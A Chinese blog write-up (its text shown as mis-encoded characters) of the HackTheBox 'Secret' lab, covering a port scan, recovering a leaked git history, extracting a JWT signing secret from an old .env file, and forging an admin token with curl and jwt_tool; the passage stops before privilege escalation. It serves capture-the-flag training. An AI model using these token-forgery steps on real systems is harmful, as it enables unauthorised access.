<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Secret - Hackthebox | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Secreté¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†é¦–å…ˆè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.120 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-08 02:09 EST Nmap sc">
<meta property="og:type" content="article">
<meta property="og:title" content="Secret - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Secreté¶åœºä¿¡æ¯  é¶åœºç±»å‹  ä¿¡æ¯æœé›†é¦–å…ˆè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~&#x2F;Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.120 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-11-08 02:09 EST Nmap sc">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image1.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image2.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image3.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image4.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image5.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image6.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image7.png">
<meta property="article:published_time" content="2021-12-06T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:50:21.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image1.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Secret - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Secret - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-12-06T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-12-06
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Secret"><span class="post-toc-text">Hackthebox - Secret</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºç±»å‹"><span class="post-toc-text">é¶åœºç±»å‹</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ä¿¡æ¯æœé›†"><span class="post-toc-text">ä¿¡æ¯æœé›†</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#åœ¨çº¿å·¥å…·"><span class="post-toc-text">åœ¨çº¿å·¥å…·</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#JWT-Tools"><span class="post-toc-text">JWT_Tools</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#æ¼æ´åˆ©ç”¨"><span class="post-toc-text">æ¼æ´åˆ©ç”¨</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#æƒé™æå‡"><span class="post-toc-text">æƒé™æå‡</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Shell-1"><span class="post-toc-text">Shell 1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Shell-2"><span class="post-toc-text">Shell 2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Shell-1-ç¬¬äºŒæ¬¡"><span class="post-toc-text">Shell 1 ç¬¬äºŒæ¬¡</span></a></li></ol></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-Secret"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Secret - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-12-06 19:38:36" datetime="2021-12-06T11:38:36.000Z"  itemprop="datePublished">2021-12-06</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Secret"><a href="#Hackthebox-Secret" class="headerlink" title="Hackthebox - Secret"></a>Hackthebox - Secret</h1><h2 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a><strong>é¶åœºä¿¡æ¯</strong></h2><img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image1.png" class>

<h2 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a><strong>é¶åœºç±»å‹</strong></h2><img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image2.png" class>

<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a><strong>ä¿¡æ¯æœé›†</strong></h2><p>é¦–å…ˆè¿›è¡Œç«¯å£æ‰«æ</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.120
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 02:09 EST
Nmap scan report for 10.10.11.120
Host is up (0.40s latency).
Not shown: 65532 closed ports
PORT Â  Â  STATE SERVICE VERSION
22/tcp Â  open  ssh Â  Â  OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| Â  3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
| Â  256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp Â  open  http Â   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http Â   Node.js (Express middleware)
|_http-title: DUMB Docs
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=11/8%OT=22%CT=1%CU=33102%PV=Y%DS=2%DC=T%G=Y%TM=6188CD7
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT Â  Â  Â  ADDRESS
1 Â  851.60 ms 10.10.14.1
2 Â  713.96 ms 10.10.11.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.73 seconds
</code></pre>
<p>ç»è¿‡æŸ¥çœ‹åå‘ç°<code>80</code>ç«¯å£å’Œ<code>3000</code>ç«¯å£å†…å®¹ä¸€è‡´</p>
<p>å’±ä»¬å»çœ‹çœ‹<code>80</code>ç«¯å£çš„å†…å®¹</p>
<img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image3.png" class>

<p>è¿™å¥½åƒæ˜¯ä¸€ä¸ªæ–‡ä»¶ç®¡ç†æœåŠ¡å™¨ä¹‹ç±»çš„ä»€ä¹ˆä¸œè¥¿çš„ï¼Ÿå’±è‹±æ–‡ä¸å¥½ï¼Œå’±ä¹Ÿä¸çŸ¥é“ï¼Œå’±ä¹Ÿä¸æ•¢é—®</p>
<p>å³ä¸Šè§’æœ‰ä¸ªæŒ‰é’®<code>Live Demo</code>ï¼Œåæ­£ç‚¹äº†ä¹Ÿä¸ä¼šçˆ†ç‚¸ï¼Œç‚¹ç‚¹çœ‹å‘—</p>
<img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image4.png" class>

<p>è¿™æ˜¯APIæ¥å£å•Šï¼Œä½†æ˜¯å¥½åƒæ²¡æœ‰å†…å®¹ï¼Œå’±ä»¬å¾€ä¸‹çœ‹çœ‹</p>
<img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image5.png" class>

<p>è¿™é‡Œå¥½åƒæ˜¯å¯ä»¥ä¸‹è½½æºä»£ç ï¼Œç®¡ä»–çš„å…ˆä¸‹è½½ä¸‹æ¥çœ‹çœ‹å‘—</p>
<img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image6.png" class>

<p>è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œç„¶åè¿˜æœ‰gitæ–‡ä»¶æ³„éœ²ï¼Œé‚£å°±å…ˆä¸‹è½½ä¸‹æ¥å˜›</p>
<blockquote>
<p><a href="https://github.com/LucifielHack/GitTools" target="_blank" rel="noopener">https://github.com/LucifielHack/GitTools</a></p>
</blockquote>
<p>ä¸‹è½½ä¸‹æ¥ååˆ©ç”¨ä¸€ä¸‹</p>
<pre><code class="Plain">/root/Desktop/GitTools/Extractor/extractor.sh local-web/ dump
</code></pre>
<p>å†…å®¹æ¯”è¾ƒå¤šï¼Œå’±ä»¬ç­‰ä»–å…ˆä¸‹è½½å®Œå§ï¼Œç­‰çš„æ—¶å€™å¯ä»¥å»çœ‹ä¼šå„¿è§†é¢‘</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump]
â””â”€# ls -la
æ€»ç”¨é‡ 32
drwxr-xr-x 8 root root 4096 11æœˆ 29 20:53 .
drwxr-xr-x 6 root root 4096 11æœˆ 29 20:47 ..
drwxr-xr-x 7 root root 4096 11æœˆ 29 20:48 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
drwxr-xr-x 7 root root 4096 11æœˆ 29 20:50 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8
drwxr-xr-x 7 root root 4096 11æœˆ 29 20:51 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
drwxr-xr-x 7 root root 4096 11æœˆ 29 20:52 3-de0a46b5107a2f4d26e348303e76d85ae4870934
drwxr-xr-x 7 root root 4096 11æœˆ 29 20:53 4-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
drwxr-xr-x 7 root root 4096 11æœˆ 29 20:54 5-3a367e735ee76569664bf7754eaaade7c735d702
</code></pre>
<p>å®Œæˆåå¯ä»¥çœ‹åˆ°æœ‰æå–å‡ºå…­æ¬¡æ•°æ®ï¼Œå’±ä»¬éšä¾¿è¿›ä¸€ä¸ªçœ‹çœ‹</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]
â””â”€# ls -la
æ€»ç”¨é‡ 116
drwxr-xr-x Â  7 root root  4096 11æœˆ 29 20:48 .
drwxr-xr-x Â  8 root root  4096 11æœˆ 29 20:53 ..
-rw-r--r-- Â  1 root root Â  219 11æœˆ 29 20:47 commit-meta.txt
-rw-r--r-- Â  1 root root Â  174 11æœˆ 29 20:47 .env
-rw-r--r-- Â  1 root root Â  885 11æœˆ 29 20:47 index.js
drwxr-xr-x Â  2 root root  4096 11æœˆ 29 20:47 model
drwxr-xr-x 201 root root  4096 11æœˆ 29 20:48 node_modules
-rw-r--r-- Â  1 root root Â  491 11æœˆ 29 20:48 package.json
-rw-r--r-- Â  1 root root 69452 11æœˆ 29 20:48 package-lock.json
drwxr-xr-x Â  3 root root  4096 11æœˆ 29 20:48 public
drwxr-xr-x Â  2 root root  4096 11æœˆ 29 20:48 routes
drwxr-xr-x Â  4 root root  4096 11æœˆ 29 20:48 src
-rw-r--r-- Â  1 root root Â  651 11æœˆ 29 20:48 validations.js
</code></pre>
<p>å¯ä»¥ç¡®å®šæ˜¯ä¸€ä¸ªæºç åº“äº†ï¼Œçªç ´å£åœ¨<code>/routes/auto.js</code>ä¸­</p>
<pre><code class="Plain">const router = require(&#39;express&#39;).Router();
const User = require(&#39;../model/user&#39;);
const bcrypt = require(&#39;bcryptjs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)
const { registerValidation, loginValidation} = require(&#39;../validations&#39;)

router.post(&#39;/register&#39;, async (req, res) =&gt; {

 Â   // validation
 Â   const { error } = registerValidation(req.body)
 Â   if (error) return res.status(400).send(error.details[0].message);

 Â   // check if user exists
 Â   const emailExist = await User.findOne({email:req.body.email})
 Â   if (emailExist) return res.status(400).send(&#39;Email already Exist&#39;)

 Â   // check if user name exist
 Â   const unameexist = await User.findOne({ name: req.body.name })
 Â   if (unameexist) return res.status(400).send(&#39;Name already Exist&#39;)

 Â   //hash the password
 Â   const salt = await bcrypt.genSalt(10);
 Â   const hashPaswrod = await bcrypt.hash(req.body.password, salt)

 Â   //create a user
 Â   const user = new User({
 Â  Â  Â   name: req.body.name,
 Â  Â  Â   email: req.body.email,
 Â  Â  Â   password:hashPaswrod
 Â   });

 Â   try{
 Â  Â  Â   const saveduser = await user.save();
 Â  Â  Â   res.send({ user: user.name})

 Â   }
 Â   catch(err){
 Â  Â  Â   console.log(err)
 Â   }

});

// login

router.post(&#39;/login&#39;, async  (req , res) =&gt; {

 Â   const { error } = loginValidation(req.body)
 Â   if (error) return res.status(400).send(error.details[0].message);

 Â   // check if email is okay
 Â   const user = await User.findOne({ email: req.body.email })
 Â   if (!user) return res.status(400).send(&#39;Email is wrong&#39;);

 Â   // check password
 Â   const validPass = await bcrypt.compare(req.body.password, user.password)
 Â   if (!validPass) return res.status(400).send(&#39;Password is wrong&#39;);

 Â   // create jwt
 Â   const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
 Â   res.header(&#39;auth-token&#39;, token).send(token);

})

router.use(function (req, res, next) {
 Â   res.json({
 Â  Â  Â   message: {

 Â  Â  Â  Â  Â   message: &quot;404 page not found&quot;,
 Â  Â  Â  Â  Â   desc: &quot;page you are looking for is not found. &quot;
 Â  Â  Â   }
 Â   })
});

module.exports = router
</code></pre>
<p>è¿™æ˜¯<code>auto.js</code> å†…çš„æºç ï¼Œå¯ä»¥çœ‹å‡ºæ¥æœ‰<code>/register</code>æ¥è¯·æ±‚å®ƒ</p>
<p>é¦–å…ˆæ·»åŠ ä¸€ä¸ªDNSè§£æ</p>
<pre><code class="Plain">echo 10.10.11.120 secret.htb &gt;&gt; /etc/hosts
</code></pre>
<p>æ„é€ ä¸€ä¸ªpayloadæ¥æ³¨å†Œç”¨æˆ·</p>
<pre><code class="Plain">curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/register --data &#39;{&quot;name&quot;: &quot;lucifiel&quot;,&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39;
</code></pre>
<p>ç„¶åä½¿ç”¨æ³¨å†Œçš„ç”¨æˆ·è¿›è¡Œç™»å½•</p>
<pre><code class="Plain">curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/login --data &#39;{&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39;
</code></pre>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# curl -X POST -H &#39;Content-Type: application/json&#39; -v http://secret.htb/api/user/login --data &#39;{&quot;email&quot;: &quot;lucifiel@lucifiel.com&quot;,&quot;password&quot;: &quot;123456&quot;}&#39;
Note: Unnecessary use of -X or --request, POST is already inferred.
* Â  Trying 10.10.11.120:80...
* Connected to secret.htb (10.10.11.120) port 80 (#0)
&gt; POST /api/user/login HTTP/1.1
&gt; Host: secret.htb
&gt; User-Agent: curl/7.74.0
&gt; Accept: */*
&gt; Content-Type: application/json
&gt; Content-Length: 55
&gt;
* upload completely sent off: 55 out of 55 bytes
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Server: nginx/1.18.0 (Ubuntu)
&lt; Date: Mon, 06 Dec 2021 06:28:56 GMT
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 216
&lt; Connection: keep-alive
&lt; X-Powered-By: Express
&lt; auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM
&lt; ETag: W/&quot;d8-L4wZphXtP/sfJQE0ke71PfuUMnY&quot;
&lt;
* Connection #0 to host secret.htb left intact
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM
</code></pre>
<p>æˆåŠŸç™»å½•å¹¶è·å–åˆ°token</p>
<p>æŸ¥çœ‹å¹¶åˆ†æ<code>/routes/verifytoken.js</code>æ–‡ä»¶çš„å†…å®¹</p>
<pre><code class="Plain">const jwt = require(&quot;jsonwebtoken&quot;);

module.exports = function (req, res, next) {
 Â   const token = req.header(&quot;auth-token&quot;);
 Â   if (!token) return res.status(401).send(&quot;Access Denied&quot;);

 Â   try {
 Â  Â  Â   const verified = jwt.verify(token, process.env.TOKEN_SECRET);
 Â  Â  Â   req.user = verified;
 Â  Â  Â   next();
 Â   } catch (err) {
 Â  Â  Â   res.status(400).send(&quot;Invalid Token&quot;);
 Â   }
};
</code></pre>
<p>æˆ‘ä»¬çŸ¥é“äº†JWTä»¤ç‰Œçš„éªŒè¯è¿‡ç¨‹ï¼Œé‚£æˆ‘ä»¬å°±æ„é€ ä¸€ä¸ªpayloadæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬å½“å‰çš„æƒé™</p>
<pre><code class="Plain">curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM&#39;
</code></pre>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoibHVjaWZpZWwiLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.i-XDDPEDPnogLpVNIKO-U4vQCyQqsIWCN5Ib_OjwSrM&#39;
{&quot;role&quot;:{&quot;role&quot;:&quot;you are normal user&quot;,&quot;desc&quot;:&quot;lucifiel&quot;}}
</code></pre>
<p>å¾—åˆ°å›åŒ…ï¼Œæˆ‘ä»¬æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·æƒé™</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]
â””â”€# cat .env
DB_CONNECT = &#39;mongodb://127.0.0.1:27017/auth-web&#39;
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
</code></pre>
<p>æŸ¥çœ‹æ ¹ç›®å½•çš„<code>.env</code>æ–‡ä»¶ï¼Œå¾—åˆ°äº†ä¸€æ®µtokne</p>
<pre><code class="Plain">const router = require(&#39;express&#39;).Router();
const verifytoken = require(&#39;./verifytoken&#39;)
const User = require(&#39;../model/user&#39;);

router.get(&#39;/priv&#39;, verifytoken, (req, res) =&gt; {
 Â  // res.send(req.user)

 Â   const userinfo = { name: req.user }

 Â   const name = userinfo.name.name;

 Â   if (name == &#39;theadmin&#39;){
 Â  Â  Â   res.json({
 Â  Â  Â  Â  Â   role:{

 Â  Â  Â  Â  Â  Â  Â   role:&quot;you are admin&quot;,
 Â  Â  Â  Â  Â  Â  Â   desc : &quot;{flag will be here}&quot;
 Â  Â  Â  Â  Â   }
 Â  Â  Â   })
 Â   }
 Â   else{
 Â  Â  Â   res.json({
 Â  Â  Â  Â  Â   role: {
 Â  Â  Â  Â  Â  Â  Â   role: &quot;you are normal user&quot;,
 Â  Â  Â  Â  Â  Â  Â   desc: userinfo.name.name
 Â  Â  Â  Â  Â   }
 Â  Â  Â   })
 Â   }

})

router.use(function (req, res, next) {
 Â   res.json({
 Â  Â  Â   message: {

 Â  Â  Â  Â  Â   message: &quot;404 page not found&quot;,
 Â  Â  Â  Â  Â   desc: &quot;page you are looking for is not found. &quot;
 Â  Â  Â   }
 Â   })
});

module.exports = router
</code></pre>
<p>é€šè¿‡æŸ¥çœ‹private.jså¾—çŸ¥éªŒè¯é€»è¾‘æ˜¯åªè¦name &#x3D; theadmin å°±æ˜¯adminè´¦æˆ·ï¼Œé‚£æˆ‘ä»¬æ¥ä¼ªé€ ä¸€ä¸ªJWTä»¤ç‰Œå³å¯</p>
<p>ä½¿ç”¨åœ¨çº¿JWTä¿®æ”¹å·¥å…·æˆ–jwt_toolsè¿›è¡ŒJWTä»¤ç‰Œä¿®æ”¹éƒ½å¯ä»¥</p>
<blockquote>
<p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a></p>
</blockquote>
<blockquote>
<p><a href="https://github.com/ticarpi/jwt_tool" target="_blank" rel="noopener">https://github.com/ticarpi/jwt_tool</a></p>
</blockquote>
<h3 id="åœ¨çº¿å·¥å…·"><a href="#åœ¨çº¿å·¥å…·" class="headerlink" title="åœ¨çº¿å·¥å…·"></a><strong>åœ¨çº¿å·¥å…·</strong></h3><p>ç„¶åä¼ªé€ ä¸€ä¸ªadminçš„tokenå°±å¯ä»¥äº†</p>
<img src="/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/image7.png" class>

<p>è¿™é‡Œéœ€è¦ä¿®æ”¹ä¸¤ä¸ªåœ°æ–¹ï¼ŒæŠŠnameå¤„ä¿®æ”¹ä¸ºtheadminï¼Œç„¶ååœ¨ä¸‹æ–¹æ¡†å†…å¡«å…¥æˆ‘ä»¬åœ¨<code>.env</code>è·å–åˆ°çš„tokenå€¼ï¼Œå³å¯ç”Ÿæˆä¸€æ®µæ–°çš„JWTä»¤ç‰Œ</p>
<h3 id="JWT-Tools"><a href="#JWT-Tools" class="headerlink" title="JWT_Tools"></a><strong>JWT_Tools</strong></h3><pre><code class="Plain">python3 jwt_tool.py -I -S hs256 -pc &#39;name&#39; -pv &#39;theadmin&#39; -p &#39;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#39; eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoib29wc2llIiwiZW1haWwiOiJvb3BzaWVAb29wcy5jb20iLCJpYXQiOjE2MzU2NTc4NTd9.7v-DST155DL_5yuhC9Zbe2rdyPiGCcd8aeYUucQLVzU
</code></pre>
<p>æˆ‘ä»¬ç»§ç»­</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]
